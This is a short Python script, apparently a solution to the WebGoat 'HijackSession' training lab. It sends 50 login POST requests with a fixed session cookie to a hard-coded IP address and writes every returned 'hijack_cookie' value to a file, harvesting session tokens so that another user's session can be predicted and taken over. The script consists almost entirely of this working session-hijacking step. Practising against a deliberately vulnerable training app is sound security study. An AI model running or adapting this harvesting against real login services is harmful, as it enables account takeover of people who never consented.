import requests

url = "http://15.160.208.229:8080/WebGoat/HijackSession/login"

cookies = {
        "JSESSIONID":"LQtnnlE0kg_Lqfb1nr6OKKMiiQrHUH2qP8jm4fpd"
        }

#In case is a post request
params = {
        "username":"",
        "password":""
        } 

with open("hijacking.txt", "w") as f:

    for _ in range(50):

        r = requests.post(url=url, cookies=cookies, params=params)
        data = r.cookies.get("hijack_cookie")
        f.write(data + "\n")
        print(data)

